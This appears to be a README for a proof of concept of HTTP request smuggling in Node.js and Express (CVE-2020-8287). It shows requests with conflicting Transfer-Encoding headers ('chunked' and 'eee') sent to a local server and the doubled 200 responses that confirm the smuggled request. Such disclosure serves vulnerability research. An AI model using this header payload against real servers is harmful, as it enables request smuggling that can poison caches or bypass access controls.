# nodejs-http-transfer-encoding-smuggling-poc

PoC of HTTP Request Smuggling in nodejs (CVE-2020-8287)

## `src/index.js`

```js
{
  header: [
    'Host',
    '127.0.0.1',
    'Transfer-Encoding',
    'chunked',
    'Transfer-Encoding',
    'eee'
  ],
  body: 'A'
}
{ header: [ 'Host', '127.0.0.1' ], body: '' }
{
  data: 'HTTP/1.1 200 OK\r\n' +
    'Date: Tue, 05 Jan 2021 09:55:33 GMT\r\n' +
    'Connection: keep-alive\r\n' +
    'Keep-Alive: timeout=5\r\n' +
    'Content-Length: 0\r\n' +
    '\r\n' +
    'HTTP/1.1 200 OK\r\n' +
    'Date: Tue, 05 Jan 2021 09:55:33 GMT\r\n' +
    'Connection: keep-alive\r\n' +
    'Keep-Alive: timeout=5\r\n' +
    'Content-Length: 0\r\n' +
    '\r\n'
}
```

## `src/express.js`

```js
{
  header: { host: '127.0.0.1', 'transfer-encoding': 'chunked, eee' },
  body: 'A'
}
{ header: { host: '127.0.0.1' }, body: '' }
{
  data: 'HTTP/1.1 200 OK\r\n' +
    'X-Powered-By: Express\r\n' +
    'Date: Tue, 05 Jan 2021 09:56:19 GMT\r\n' +
    'Connection: keep-alive\r\n' +
    'Keep-Alive: timeout=5\r\n' +
    'Content-Length: 0\r\n' +
    '\r\n' +
    'HTTP/1.1 200 OK\r\n' +
    'X-Powered-By: Express\r\n' +
    'Date: Tue, 05 Jan 2021 09:56:19 GMT\r\n' +
    'Connection: keep-alive\r\n' +
    'Keep-Alive: timeout=5\r\n' +
    'Content-Length: 0\r\n' +
    '\r\n'
}
```
